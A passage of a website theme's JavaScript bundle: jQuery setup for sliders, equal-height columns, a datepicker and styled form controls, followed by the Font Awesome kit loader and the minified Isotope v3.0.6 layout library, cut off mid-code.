jQuery(function(){
    //functions
    initMatchHeight();
    initSliderPartialView();
    initSliderPartialViewSingle();
    initDatePicker();
    initCustomForms();
});

function initMatchHeight() {

    jQuery('.item-matchheight').matchHeight({
        byRow: false,
        property: 'height',
        target: null,
        remove: false
    });

    jQuery('.post-col').matchHeight({
        byRow: false,
        property: 'height',
        target: null,
        remove: false
    });

    jQuery('.blog-list-wrapper .copies').matchHeight({
        byRow: false,
        property: 'height',
        target: null,
        remove: false
    });



}

function initCustomForms(){
    jcf.setOptions('Select', {
        wrapNative: false,
        maxVisibleItems: 8
    });

    jcf.destroyAll("select");
    jcf.replace("select",'Select');

    jcf.destroyAll('input[type="checkbox"]');
    jcf.replace('input[type="checkbox"]','Checkbox');

    jcf.destroyAll('input[type="radio"]');
    jcf.replace('input[type="radio"]','Radio');

    jcf.destroyAll('input[type="file"]');
    jcf.replace('input[type="file"]','File');

}


function initSliderPartialView() {

    jQuery('.slider-partial-view .et_pb_column').slick({
        centerMode: true,
        centerPadding: '250px',
        slidesToShow: 1,
        responsive: [
            {
                breakpoint: 980,
                settings: {
                    arrows: true,
                    centerMode: false,
                    autoplay: true,
                    dots: true
                }
            }
        ]
    });

}

function initSliderPartialViewSingle() {

    jQuery('.slider-partial-view-singles.et_pb_column').slick({
        centerMode: true,
        centerPadding: '250px',
        slidesToShow: 1,
        responsive: [
            {
                breakpoint: 980,
                settings: {
                    arrows: true,
                    centerMode: false,
                    autoplay: true,
                    dots: true
                }
            }
        ]
    });

}


function initDatePicker() {
    jQuery( function() {
        jQuery('.datepicker').datepicker({
            dateFormat: 'yy-mm-dd'
            ,	duration: 'fast'
        });
    } );
}

window.FontAwesomeKitConfig = {"asyncLoading":{"enabled":true},"autoA11y":{"enabled":true},"baseUrl":"https://kit-free.fontawesome.com","detectConflictsUntil":null,"license":"free","method":"css","minify":{"enabled":true},"v4FontFaceShim":{"enabled":true},"v4shim":{"enabled":true},"version":"latest"};
!function(){function r(e){var t,n=[],i=document,o=i.documentElement.doScroll,r="DOMContentLoaded",a=(o?/^loaded|^c/:/^loaded|^i|^c/).test(i.readyState);a||i.addEventListener(r,t=function(){for(i.removeEventListener(r,t),a=1;t=n.shift();)t()}),a?setTimeout(e,0):n.push(e)}!function(){if(!(void 0===window.Element||"classList"in document.documentElement)){var e,t,n,i=Array.prototype,o=i.push,r=i.splice,a=i.join;d.prototype={add:function(e){this.contains(e)||(o.call(this,e),this.el.className=this.toString())},contains:function(e){return-1!=this.el.className.indexOf(e)},item:function(e){return this[e]||null},remove:function(e){if(this.contains(e)){for(var t=0;t<this.length&&this[t]!=e;t++);r.call(this,t,1),this.el.className=this.toString()}},toString:function(){return a.call(this," ")},toggle:function(e){return this.contains(e)?this.remove(e):this.add(e),this.contains(e)}},window.DOMTokenList=d,e=Element.prototype,t="classList",n=function(){return new d(this)},Object.defineProperty?Object.defineProperty(e,t,{get:n}):e.__defineGetter__(t,n)}function d(e){for(var t=(this.el=e).className.replace(/^\s+|\s+$/g,"").split(/\s+/),n=0;n<t.length;n++)o.call(this,t[n])}}();function a(e){var t,n,i,o;prefixesArray=e||["fa"],prefixesSelectorString="."+Array.prototype.join.call(e,",."),t=document.querySelectorAll(prefixesSelectorString),Array.prototype.forEach.call(t,function(e){n=e.getAttribute("title"),e.setAttribute("aria-hidden","true"),i=!e.nextElementSibling||!e.nextElementSibling.classList.contains("sr-only"),n&&i&&((o=document.createElement("span")).innerHTML=n,o.classList.add("sr-only"),e.parentNode.insertBefore(o,e.nextSibling))})}var d=function(e,t){var n=document.createElement("link");n.href=e,n.media="all",n.rel="stylesheet",n.id="font-awesome-5-kit-css",t&&t.detectingConflicts&&t.detectionIgnoreAttr&&n.setAttributeNode(document.createAttribute(t.detectionIgnoreAttr)),document.getElementsByTagName("head")[0].appendChild(n)},c=function(e,t){!function(e,t){var n,i=t&&t.before||void 0,o=t&&t.media||void 0,r=window.document,a=r.createElement("link");if(t&&t.detectingConflicts&&t.detectionIgnoreAttr&&a.setAttributeNode(document.createAttribute(t.detectionIgnoreAttr)),i)n=i;else{var d=(r.body||r.getElementsByTagName("head")[0]).childNodes;n=d[d.length-1]}var c=r.styleSheets;a.rel="stylesheet",a.href=e,a.media="only x",function e(t){if(r.body)return t();setTimeout(function(){e(t)})}(function(){n.parentNode.insertBefore(a,i?n:n.nextSibling)});var s=function(e){for(var t=a.href,n=c.length;n--;)if(c[n].href===t)return e();setTimeout(function(){s(e)})};function l(){a.addEventListener&&a.removeEventListener("load",l),a.media=o||"all"}a.addEventListener&&a.addEventListener("load",l),(a.onloadcssdefined=s)(l)}(e,t)},e=function(e,t,n){var i=t&&void 0!==t.autoFetchSvg?t.autoFetchSvg:void 0,o=t&&void 0!==t.async?t.async:void 0,r=t&&void 0!==t.autoA11y?t.autoA11y:void 0,a=document.createElement("script"),d=document.scripts[0];a.src=e,void 0!==r&&a.setAttribute("data-auto-a11y",r?"true":"false"),i&&(a.setAttributeNode(document.createAttribute("data-auto-fetch-svg")),a.setAttribute("data-fetch-svg-from",t.fetchSvgFrom)),o&&a.setAttributeNode(document.createAttribute("defer")),n&&n.detectingConflicts&&n.detectionIgnoreAttr&&a.setAttributeNode(document.createAttribute(n.detectionIgnoreAttr)),d.parentNode.appendChild(a)};function s(e,t){var n=t&&t.addOn||"",i=t&&t.baseFilename||e.license+n,o=t&&t.minify?".min":"",r=t&&t.fileSuffix||e.method,a=t&&t.subdir||e.method;return e.baseUrl+"/releases/"+("latest"===e.version?"latest":"v".concat(e.version))+"/"+a+"/"+i+o+"."+r}var t,n,i,o,l;try{if(window.FontAwesomeKitConfig){var u,f=window.FontAwesomeKitConfig,m={detectingConflicts:f.detectConflictsUntil&&new Date<=new Date(f.detectConflictsUntil),detectionIgnoreAttr:"data-fa-detection-ignore",detectionTimeoutAttr:"data-fa-detection-timeout",detectionTimeout:null};"js"===f.method&&(o=m,l={async:(i=f).asyncLoading.enabled,autoA11y:i.autoA11y.enabled},"pro"===i.license&&(l.autoFetchSvg=!0,l.fetchSvgFrom=i.baseUrl+"/releases/"+("latest"===i.version?"latest":"v".concat(i.version))+"/svgs"),i.v4shim.enabled&&e(s(i,{addOn:"-v4-shims",minify:i.minify.enabled})),e(s(i,{minify:i.minify.enabled}),l,o)),"css"===f.method&&function(e,t){var n,i=a.bind(a,["fa","fab","fas","far","fal","fad"]);e.autoA11y.enabled&&(r(i),n=i,"undefined"!=typeof MutationObserver&&new MutationObserver(n).observe(document,{childList:!0,subtree:!0})),e.v4shim.enabled&&(e.license,e.asyncLoading.enabled?c(s(e,{addOn:"-v4-shims",minify:e.minify.enabled}),t):d(s(e,{addOn:"-v4-shims",minify:e.minify.enabled}),t));e.v4FontFaceShim.enabled&&(e.asyncLoading.enabled?c(s(e,{addOn:"-v4-font-face",minify:e.minify.enabled}),t):d(s(e,{addOn:"-v4-font-face",minify:e.minify.enabled}),t));var o=s(e,{minify:e.minify.enabled});e.asyncLoading.enabled?c(o,t):d(o,t)}(f,m),m.detectingConflicts&&((u=document.currentScript.getAttribute(m.detectionTimeoutAttr))&&(m.detectionTimeout=u),document.currentScript.setAttributeNode(document.createAttribute(m.detectionIgnoreAttr)),t=f,n=m,r(function(){var e=document.createElement("script");n&&n.detectionIgnoreAttr&&e.setAttributeNode(document.createAttribute(n.detectionIgnoreAttr)),n&&n.detectionTimeoutAttr&&n.detectionTimeout&&e.setAttribute(n.detectionTimeoutAttr,n.detectionTimeout),e.src=s(t,{baseFilename:"conflict-detection",fileSuffix:"js",subdir:"js",minify:t.minify.enabled}),e.async=!0,document.body.appendChild(e)}))}}catch(e){}}();

/*!
 * Isotope PACKAGED v3.0.6
 *
 * Licensed GPLv3 for open source use
 * or Isotope Commercial License for commercial use
 *
 * https://isotope.metafizzy.co
 * Copyright 2010-2018 Metafizzy
 */

!function(t,e){"function"==typeof define&&define.amd?define("jquery-bridget/jquery-bridget",["jquery"],function(i){return e(t,i)}):"object"==typeof module&&module.exports?module.exports=e(t,require("jquery")):t.jQueryBridget=e(t,t.jQuery)}(window,function(t,e){"use strict";function i(i,s,a){function u(t,e,o){var n,s="$()."+i+'("'+e+'")';return t.each(function(t,u){var h=a.data(u,i);if(!h)return void r(i+" not initialized. Cannot call methods, i.e. "+s);var d=h[e];if(!d||"_"==e.charAt(0))return void r(s+" is not a valid method");var l=d.apply(h,o);n=void 0===n?l:n}),void 0!==n?n:t}function h(t,e){t.each(function(t,o){var n=a.data(o,i);n?(n.option(e),n._init()):(n=new s(o,e),a.data(o,i,n))})}a=a||e||t.jQuery,a&&(s.prototype.option||(s.prototype.option=function(t){a.isPlainObject(t)&&(this.options=a.extend(!0,this.options,t))}),a.fn[i]=function(t){if("string"==typeof t){var e=n.call(arguments,1);return u(this,t,e)}return h(this,t),this},o(a))}function o(t){!t||t&&t.bridget||(t.bridget=i)}var n=Array.prototype.slice,s=t.console,r="undefined"==typeof s?function(){}:function(t){s.error(t)};return o(e||t.jQuery),i}),function(t,e){"function"==typeof define&&define.amd?define("ev-emitter/ev-emitter",e):"object"==typeof module&&module.exports?module.exports=e():t.EvEmitter=e()}("undefined"!=typeof window?window:this,function(){function t(){}var e=t.prototype;return e.on=function(t,e){if(t&&e){var i=this._events=this._events||{},o=i[t]=i[t]||[];return o.indexOf(e)==-1&&o.push(e),this}},e.once=function(t,e){if(t&&e){this.on(t,e);var i=this._onceEvents=this._onceEvents||{},o=i[t]=i[t]||{};return o[e]=!0,this}},e.off=function(t,e){var i=this._events&&this._events[t];if(i&&i.length){var o=i.indexOf(e);return o!=-1&&i.splice(o,1),this}},e.emitEvent=function(t,e){var i=this._events&&this._events[t];if(i&&i.length){i=i.slice(0),e=e||[];for(var o=this._onceEvents&&this._onceEvents[t],n=0;n<i.length;n++){var s=i[n],r=o&&o[s];r&&(this.off(t,s),delete o[s]),s.apply(this,e)}return this}},e.allOff=function(){delete this._events,delete this._onceEvents},t}),function(t,e){"function"==typeof define&&define.amd?define("get-size/get-size",e):"object"==typeof module&&module.exports?module.exports=e():t.getSize=e()}(window,function(){"use strict";function t(t){var e=parseFloat(t),i=t.indexOf("%")==-1&&!isNaN(e);return i&&e}function e(){}function i(){for(var t={width:0,height:0,innerWidth:0,innerHeight:0,outerWidth:0,outerHeight:0},e=0;e<h;e++){var i=u[e];t[i]=0}return t}function o(t){var e=getComputedStyle(t);return e||a("Style returned "+e+". Are you running this code in a hidden iframe on Firefox? See https://bit.ly/getsizebug1"),e}function n(){if(!d){d=!0;var e=document.createElement("div");e.style.width="200px",e.style.padding="1px 2px 3px 4px",e.style.borderStyle="solid",e.style.borderWidth="1px 2px 3px 4px",e.style.boxSizing="border-box";var i=document.body||document.documentElement;i.appendChild(e);var n=o(e);r=200==Math.round(t(n.width)),s.isBoxSizeOuter=r,i.removeChild(e)}}function s(e){if(n(),"string"==typeof e&&(e=document.querySelector(e)),e&&"object"==typeof e&&e.nodeType){var s=o(e);if("none"==s.display)return i();var a={};a.width=e.offsetWidth,a.height=e.offsetHeight;for(var d=a.isBorderBox="border-box"==s.boxSizing,l=0;l<h;l++){var f=u[l],c=s[f],m=parseFloat(c);a[f]=isNaN(m)?0:m}var p=a.paddingLeft+a.paddingRight,y=a.paddingTop+a.paddingBottom,g=a.marginLeft+a.marginRight,v=a.marginTop+a.marginBottom,_=a.borderLeftWidth+a.borderRightWidth,z=a.borderTopWidth+a.borderBottomWidth,I=d&&r,x=t(s.width);x!==!1&&(a.width=x+(I?0:p+_));var S=t(s.height);return S!==!1&&(a.height=S+(I?0:y+z)),a.innerWidth=a.width-(p+_),a.innerHeight=a.height-(y+z),a.outerWidth=a.width+g,a.outerHeight=a.height+v,a}}var r,a="undefined"==typeof console?e:function(t){console.error(t)},u=["paddingLeft","paddingRight","paddingTop","paddingBottom","marginLeft","marginRight","marginTop","marginBottom","borderLeftWidth","borderRightWidth","borderTopWidth","borderBottomWidth"],h=u.length,d=!1;return s}),function(t,e){"use strict";"function"==typeof define&&define.amd?define("desandro-matches-selector/matches-selector",e):"object"==typeof module&&module.exports?module.exports=e():t.matchesSelector=e()}(window,function(){"use strict";var t=function(){var t=window.Element.prototype;if(t.matches)return"matches";if(t.matchesSelector)return"matchesSelector";for(var e=["webkit","moz","ms","o"],i=0;i<e.length;i++){var o=e[i],n=o+"MatchesSelector";if(t[n])return n}}();return function(e,i){return e[t](i)}}),function(t,e){"function"==typeof define&&define.amd?define("fizzy-ui-utils/utils",["desandro-matches-selector/matches-selector"],function(i){return e(t,i)}):"object"==typeof module&&module.exports?module.exports=e(t,require("desandro-matches-selector")):t.fizzyUIUtils=e(t,t.matchesSelector)}(window,function(t,e){var i={};i.extend=function(t,e){for(var i in e)t[i]=e[i];return t},i.modulo=function(t,e){return(t%e+e)%e};var o=Array.prototype.slice;i.makeArray=function(t){if(Array.isArray(t))return t;if(null===t||void 0===t)return[];var e="object"==typeof t&&"number"==typeof t.length;return e?o.call(t):[t]},i.removeFrom=function(t,e){var i=t.indexOf(e);i!=-1&&t.splice(i,1)},i.getParent=function(t,i){for(;t.parentNode&&t!=document.body;)if(t=t.parentNode,e(t,i))return t},i.getQueryElement=function(t){return"string"==typeof t?document.querySelector(t):t},i.handleEvent=function(t){var e="on"+t.type;this[e]&&this[e](t)},i.filterFindElements=function(t,o){t=i.makeArray(t);var n=[];return t.forEach(function(t){if(t instanceof HTMLElement){if(!o)return void n.push(t);e(t,o)&&n.push(t);for(var i=t.querySelectorAll(o),s=0;s<i.length;s++)n.push(i[s])}}),n},i.debounceMethod=function(t,e,i){i=i||100;var o=t.prototype[e],n=e+"Timeout";t.prototype[e]=function(){var t=this[n];clearTimeout(t);var e=arguments,s=this;this[n]=setTimeout(function(){o.apply(s,e),delete s[n]},i)}},i.docReady=function(t){var e=document.readyState;"complete"==e||"interactive"==e?setTimeout(t):document.addEventListener("DOMContentLoaded",t)},i.toDashed=function(t){return t.replace(/(.)([A-Z])/g,function(t,e,i){return e+"-"+i}).toLowerCase()};var n=t.console;return i.htmlInit=function(e,o){i.docReady(function(){var s=i.toDashed(o),r="data-"+s,a=document.querySelectorAll("["+r+"]"),u=document.querySelectorAll(".js-"+s),h=i.makeArray(a).concat(i.makeArray(u)),d=r+"-options",l=t.jQuery;h.forEach(function(t){var i,s=t.getAttribute(r)||t.getAttribute(d);try{i=s&&JSON.parse(s)}catch(a){return void(n&&n.error("Error parsing "+r+" on "+t.className+": "+a))}var u=new e(t,i);l&&l.data(t,o,u)})})},i}),function(t,e){"function"==typeof define&&define.amd?define("outlayer/item",["ev-emitter/ev-emitter","get-size/get-size"],e):"object"==typeof module&&module.exports?module.exports=e(require("ev-emitter"),require("get-size")):(t.Outlayer={},t.Outlayer.Item=e(t.EvEmitter,t.getSize))}(window,function(t,e){"use strict";function i(t){for(var e in t)return!1;return e=null,!0}function o(t,e){t&&(this.element=t,this.layout=e,this.position={x:0,y:0},this._create())}function n(t){return t.replace(/([A-Z])/g,function(t){return"-"+t.toLowerCase()})}var s=document.documentElement.style,r="string"==typeof s.transition?"transition":"WebkitTransition",a="string"==typeof s.transform?"transform":"WebkitTransform",u={WebkitTransition:"webkitTransitionEnd",transition:"transitionend"}[r],h={transform:a,transition:r,transitionDuration:r+"Duration",transitionProperty:r+"Property",transitionDelay:r+"Delay"},d=o.prototype=Object.create(t.prototype);d.constructor=o,d._create=function(){this._transn={ingProperties:{},clean:{},onEnd:{}},this.css({position:"absolute"})},d.handleEvent=function(t){var e="on"+t.type;this[e]&&this[e](t)},d.getSize=function(){this.size=e(this.element)},d.css=function(t){var e=this.element.style;for(var i in t){var o=h[i]||i;e[o]=t[i]}},d.getPosition=function(){var t=getComputedStyle(this.element),e=this.layout._getOption("originLeft"),i=this.layout._getOption("originTop"),o=t[e?"left":"right"],n=t[i?"top":"bottom"],s=parseFloat(o),r=parseFloat(n),a=this.layout.size;o.indexOf("%")!=-1&&(s=s/100*a.width),n.indexOf("%")!=-1&&(r=r/100*a.height),s=isNaN(s)?0:s,r=isNaN(r)?0:r,s-=e?a.paddingLeft:a.paddingRight,r-=i?a.paddingTop:a.paddingBottom,this.position.x=s,this.position.y=r},d.layoutPosition=function(){var t=this.layout.size,e={},i=this.layout._getOption("originLeft"),o=this.layout._getOption("originTop"),n=i?"paddingLeft":"paddingRight",s=i?"left":"right",r=i?"right":"left",a=this.position.x+t[n];e[s]=this.getXValue(a),e[r]="";var u=o?"paddingTop":"paddingBottom",h=o?"top":"bottom",d=o?"bottom":"top",l=this.position.y+t[u];e[h]=this.getYValue(l),e[d]="",this.css(e),this.emitEvent("layout",[this])},d.getXValue=function(t){var e=this.layout._getOption("horizontal");return this.layout.options.percentPosition&&!e?t/this.layout.size.width*100+"%":t+"px"},d.getYValue=function(t){var e=this.layout._getOption("horizontal");return this.layout.options.percentPosition&&e?t/this.layout.size.height*100+"%":t+"px"},d._transitionTo=function(t,e){this.getPosition();var i=this.position.x,o=this.position.y,n=t==this.position.x&&e==this.position.y;if(this.setPosition(t,e),n&&!this.isTransitioning)return void this.layoutPosition();var s=t-i,r=e-o,a={};a.transform=this.getTranslate(s,r),this.transition({to:a,onTransitionEnd:{transform:this.layoutPosition},isCleaning:!0})},d.getTranslate=function(t,e){var i=this.layout._getOption("originLeft"),o=this.layout._getOption("originTop");return t=i?t:-t,e=o?e:-e,"translate3d("+t+"px, "+e+"px, 0)"},d.goTo=function(t,e){this.setPosition(t,e),this.layoutPosition()},d.moveTo=d._transitionTo,d.setPosition=function(t,e){this.position.x=parseFloat(t),this.position.y=parseFloat(e)},d._nonTransition=function(t){this.css(t.to),t.isCleaning&&this._removeStyles(t.to);for(var e in t.onTransitionEnd)t.onTransitionEnd[e].call(this)},d.transition=function(t){if(!parseFloat(this.layout.options.transitionDuration))return void this._nonTransition(t);var e=this._transn;for(var i in t.onTransitionEnd)e.onEnd[i]=t.onTransitionEnd[i];for(i in t.to)e.ingProperties[i]=!0,t.isCleaning&&(e.clean[i]=!0);if(t.from){this.css(t.from);var o=this.element.offsetHeight;o=null}this.enableTransition(t.to),this.css(t.to),this.isTransitioning=!0};var l="opacity,"+n(a);d.enableTransition=function(){if(!this.isTransitioning){var t=this.layout.options.transitionDuration;t="number"==typeof t?t+"ms":t,this.css({transitionProperty:l,transitionDuration:t,transitionDelay:this.staggerDelay||0}),this.element.addEventListener(u,this,!1)}},d.onwebkitTransitionEnd=function(t){this.ontransitionend(t)},d.onotransitionend=function(t){this.ontransitionend(t)};var f={"-webkit-transform":"transform"};d.ontransitionend=function(t){if(t.target===this.element){var e=this._transn,o=f[t.propertyName]||t.propertyName;if(delete e.ingProperties[o],i(e.ingProperties)&&this.disableTransition(),o in e.clean&&(this.element.style[t.propertyName]="",delete e.clean[o]),o in e.onEnd){var n=e.onEnd[o];n.call(this),delete e.onEnd[o]}this.emitEvent("transitionEnd",[this])}},d.disableTransition=function(){this.removeTransitionStyles(),this.element.removeEventListener(u,this,!1),this.isTransitioning=!1},d._removeStyles=function(t){var e={};for(var i in t)e[i]="";this.css(e)};var c={transitionProperty:"",transitionDuration:"",transitionDelay:""};return d.removeTransitionStyles=function(){this.css(c)},d.stagger=function(t){t=isNaN(t)?0:t,this.staggerDelay=t+"ms"},d.removeElem=function(){this.element.parentNode.removeChild(this.element),this.css({display:""}),this.emitEvent("remove",[this])},d.remove=function(){return r&&parseFloat(this.layout.options.transitionDuration)?(this.once("transitionEnd",function(){this.removeElem()}),void this.hide()):void this.removeElem()},d.reveal=function(){delete this.isHidden,this.css({display:""});var t=this.layout.options,e={},i=this.getHideRevealTransitionEndProperty("visibleStyle");e[i]=this.onRevealTransitionEnd,this.transition({from:t.hiddenStyle,to:t.visibleStyle,isCleaning:!0,onTransitionEnd:e})},d.onRevealTransitionEnd=function(){this.isHidden||this.emitEvent("reveal")},d.getHideRevealTransitionEndProperty=function(t){var e=this.layout.options[t];if(e.opacity)return"opacity";for(var i in e)return i},d.hide=function(){this.isHidden=!0,this.css({display:""});var t=this.layout.options,e={},i=this.getHideRevealTransitionEndProperty("hiddenStyle");e[i]=this.onHideTransitionEnd,this.transition({from:t.visibleStyle,to:t.hiddenStyle,isCleaning:!0,onTransitionEnd:e})},d.onHideTransitionEnd=function(){this.isHidden&&(this.css({display:"none"}),this.emitEvent("hide"))},d.destroy=function(){this.css({position:"",left:"",right:"",top:"",bottom:"",transition:"",transform:""})},o}),function(t,e){"use strict";"function"==typeof define&&define.amd?define("outlayer/outlayer",["ev-emitter/ev-emitter","get-size/get-size","fizzy-ui-utils/utils","./item"],function(i,o,n,s){return e(t,i,o,n,s)}):"object"==typeof module&&module.exports?module.exports=e(t,require("ev-emitter"),require("get-size"),require("fizzy-ui-utils"),require("./item")):t.Outlayer=e(t,t.EvEmitter,t.getSize,t.fizzyUIUtils,t.Outlayer.Item)}(window,function(t,e,i,o,n){"use strict";function s(t,e){var i=o.getQueryElement(t);if(!i)return void(u&&u.error("Bad element for "+this.constructor.namespace+": "+(i||t)));this.element=i,h&&(this.$element=h(this.element)),this.options=o.extend({},this.constructor.defaults),this.option(e);var n=++l;this.element.outlayerGUID=n,f[n]=this,this._create();var s=this._getOption("initLayout");s&&this.layout()}function r(t){function e(){t.apply(this,arguments)}return e.prototype=Object.create(t.prototype),e.prototype.constructor=e,e}function a(t){if("number"==typeof t)return t;var e=t.match(/(^\d*\.?\d*)(\w*)/),i=e&&e[1],o=e&&e[2];if(!i.length)return 0;i=parseFloat(i);var n=m[o]||1;return i*n}var u=t.console,h=t.jQuery,d=function(){},l=0,f={};s.namespace="outlayer",s.Item=n,s.defaults={containerStyle:{position:"relative"},initLayout:!0,originLeft:!0,originTop:!0,resize:!0,resizeContainer:!0,transitionDuration:"0.4s",hiddenStyle:{opacity:0,transform:"scale(0.001)"},visibleStyle:{opacity:1,transform:"scale(1)"}};var c=s.prototype;o.extend(c,e.prototype),c.option=function(t){o.extend(this.options,t)},c._getOption=function(t){var e=this.constructor.compatOptions[t];return e&&void 0!==this.options[e]?this.options[e]:this.options[t]},s.compatOptions={initLayout:"isInitLayout",horizontal:"isHorizontal",layoutInstant:"isLayoutInstant",originLeft:"isOriginLeft",originTop:"isOriginTop",resize:"isResizeBound",resizeContainer:"isResizingContainer"},c._create=function(){this.reloadItems(),this.stamps=[],this.stamp(this.options.stamp),o.extend(this.element.style,this.options.containerStyle);var t=this._getOption("resize");t&&this.bindResize()},c.reloadItems=function(){this.items=this._itemize(this.element.children)},c._itemize=function(t){for(var e=this._filterFindItemElements(t),i=this.constructor.Item,o=[],n=0;n<e.length;n++){var s=e[n],r=new i(s,this);o.push(r)}return o},c._filterFindItemElements=function(t){return o.filterFindElements(t,this.options.itemSelector)},c.getItemElements=function(){return this.items.map(function(t){return t.element})},c.layout=function(){this._resetLayout(),this._manageStamps();var t=this._getOption("layoutInstant"),e=void 0!==t?t:!this._isLayoutInited;this.layoutItems(this.items,e),this._isLayoutInited=!0},c._init=c.layout,c._resetLayout=function(){this.getSize()},c.getSize=function(){this.size=i(this.element)},c._getMeasurement=function(t,e){var o,n=this.options[t];n?("string"==typeof n?o=this.element.querySelector(n):n instanceof HTMLElement&&(o=n),this[t]=o?i(o)[e]:n):this[t]=0},c.layoutItems=function(t,e){t=this._getItemsForLayout(t),this._layoutItems(t,e),this._postLayout()},c._getItemsForLayout=function(t){return t.filter(function(t){return!t.isIgnored})},c._layoutItems=function(t,e){if(this._emitCompleteOnItems("layout",t),t&&t.length){var i=[];t.forEach(function(t){var o=this._getItemLayoutPosition(t);o.item=t,o.isInstant=e||t.isLayoutInstant,i.push(o)},this),this._processLayoutQueue(i)}},c._getItemLayoutPosition=function(){return{x:0,y:0}},c._processLayoutQueue=function(t){this.updateStagger(),t.forEach(function(t,e){this._positionItem(t.item,t.x,t.y,t.isInstant,e)},this)},c.updateStagger=function(){var t=this.options.stagger;return null===t||void 0===t?void(this.stagger=0):(this.stagger=a(t),this.stagger)},c._positionItem=function(t,e,i,o,n){o?t.goTo(e,i):(t.stagger(n*this.stagger),t.moveTo(e,i))},c._postLayout=function(){this.resizeContainer()},c.resizeContainer=function(){var t=this._getOption("resizeContainer");if(t){var e=this._getContainerSize();e&&(this._setContainerMeasure(e.width,!0),this._setContainerMeasure(e.height,!1))}},c._getContainerSize=d,c._setContainerMeasure=function(t,e){if(void 0!==t){var i=this.size;i.isBorderBox&&(t+=e?i.paddingLeft+i.paddingRight+i.borderLeftWidth+i.borderRightWidth:i.paddingBottom+i.paddingTop+i.borderTopWidth+i.borderBottomWidth),t=Math.max(t,0),this.element.style[e?"width":"height"]=t+"px"}},c._emitCompleteOnItems=function(t,e){function i(){n.dispatchEvent(t+"Complete",null,[e])}function o(){r++,r==s&&i()}var n=this,s=e.length;if(!e||!s)return void i();var r=0;e.forEach(function(e){e.once(t,o)})},c.dispatchEvent=function(t,e,i){var o=e?[e].concat(i):i;if(this.emitEvent(t,o),h)if(this.$element=this.$element||h(this.element),e){var n=h.Event(e);n.type=t,this.$element.trigger(n,i)}else this.$element.trigger(t,i)},c.ignore=function(t){var e=this.getItem(t);e&&(e.isIgnored=!0)},c.unignore=function(t){var e=this.getItem(t);e&&delete e.isIgnored},c.stamp=function(t){t=this._find(t),t&&(this.stamps=this.stamps.concat(t),t.forEach(this.ignore,this))},c.unstamp=function(t){t=this._find(t),t&&t.forEach(function(t){o.removeFrom(this.stamps,t),this.unignore(t)},this)},c._find=function(t){if(t)return"string"==typeof t&&(t=this.element.querySelectorAll(t)),t=o.makeArray(t)},c._manageStamps=function(){this.stamps&&this.stamps.length&&(this._getBoundingRect(),this.stamps.forEach(this._manageStamp,this))},c._getBoundingRect=function(){var t=this.element.getBoundingClientRect(),e=this.size;this._boundingRect={left:t.left+e.paddingLeft+e.borderLeftWidth,top:t.top+e.paddingTop+e.borderTopWidth,right:t.right-(e.paddingRight+e.borderRightWidth),bottom:t.bottom-(e.paddingBottom+e.borderBottomWidth)}},c._manageStamp=d,c._getElementOffset=function(t){var e=t.getBoundingClientRect(),o=this._boundingRect,n=i(t),s={left:e.left-o.left-n.marginLeft,top:e.top-o.top-n.marginTop,right:o.right-e.right-n.marginRight,bottom:o.bottom-e.bottom-n.marginBottom};return s},c.handleEvent=o.handleEvent,c.bindResize=function(){t.addEventListener("resize",this),this.isResizeBound=!0},c.unbindResize=function(){t.removeEventListener("resize",this),this.isResizeBound=!1},c.onresize=function(){this.resize()},o.debounceMethod(s,"onresize",100),c.resize=function(){this.isResizeBound&&this.needsResizeLayout()&&this.layout()},c.needsResizeLayout=function(){var t=i(this.element),e=this.size&&t;return e&&t.innerWidth!==this.size.innerWidth},c.addItems=function(t){var e=this._itemize(t);return e.length&&(this.items=this.items.concat(e)),e},c.appended=function(t){var e=this.addItems(t);e.length&&(this.layoutItems(e,!0),this.reveal(e))},c.prepended=function(t){var e=this._itemize(t);if(e.length){var i=this.items.slice(0);this.items=e.concat(i),this._resetLayout(),this._manageStamps(),this.layoutItems(e,!0),this.reveal(e),this.layoutItems(i)}},c.reveal=function(t){if(this._emitCompleteOnItems("reveal",t),t&&t.length){var e=this.updateStagger();t.forEach(function(t,i){t.stagger(i*e),t.reveal()})}},c.hide=function(t){if(this._emitCompleteOnItems("hide",t),t&&t.length){var e=this.updateStagger();t.forEach(function(t,i){t.stagger(i*e),t.hide()})}},c.revealItemElements=function(t){var e=this.getItems(t);this.reveal(e)},c.hideItemElements=function(t){var e=this.getItems(t);this.hide(e)},c.getItem=function(t){for(var e=0;e<this.items.length;e++){var i=this.items[e];if(i.element==t)return i}},c.getItems=function(t){t=o.makeArray(t);var e=[];return t.forEach(function(t){var i=this.getItem(t);i&&e.push(i)},this),e},c.remove=function(t){var e=this.getItems(t);this._emitCompleteOnItems("remove",e),e&&e.length&&e.forEach(function(t){t.remove(),o.removeFrom(this.items,t)},this)},c.destroy=function(){var t=this.element.style;t.height="",t.position="",t.width="",this.items.forEach(function(t){t.destroy()}),this.unbindResize();var e=this.element.outlayerGUID;delete f[e],delete this.element.outlayerGUID,h&&h.removeData(this.element,this.constructor.namespace)},s.data=function(t){t=o.getQueryElement(t);var e=t&&t.outlayerGUID;return e&&f[e]},s.create=function(t,e){var i=r(s);return i.defaults=o.extend({},s.defaults),o.extend(i.defaults,e),i.compatOptions=o.extend({},s.compatOptions),i.namespace=t,i.data=s.data,i.Item=r(n),o.htmlInit(i,t),h&&h.bridget&&h.bridget(t,i),i};var m={ms:1,s:1e3};return s.Item=n,s}),function(t,e){"function"==typeof define&&define.amd?define("isotope-layout/js/item",["outlayer/outlayer"],e):"object"==typeof module&&module.exports?module.exports=e(require("outlayer")):(t.Isotope=t.Isotope||{},t.Isotope.Item=e(t.Outlayer))}(window,function(t){"use strict";function e(){t.Item.apply(this,arguments)}var i=e.prototype=Object.create(t.Item.prototype),o=i._create;i._create=function(){this.id=this.layout.itemGUID++,o.call(this),this.sortData={}},i.updateSortData=function(){if(!this.isIgnored){this.sortData.id=this.id,this.sortData["original-order"]=this.id,this.sortData.random=Math.random();var t=this.layout.options.getSortData,e=this.layout._sorters;for(var i in t){var o=e[i];this.sortData[i]=o(this.element,this)}}};var n=i.destroy;return i.destroy=function(){n.apply(this,arguments),this.css({display:""})},e}),function(t,e){"function"==typeof define&&define.amd?define("isotope-layout/js/layout-mode",["get-size/get-size","outlayer/outlayer"],e):"object"==typeof module&&module.exports?module.exports=e(require("get-size"),require("outlayer")):(t.Isotope=t.Isotope||{},t.Isotope.LayoutMode=e(t.getSize,t.Outlayer))}(window,function(t,e){"use strict";function i(t){this.isotope=t,t&&(this.options=t.options[this.namespace],this.element=t.element,this.items=t.filteredItems,this.size=t.size)}var 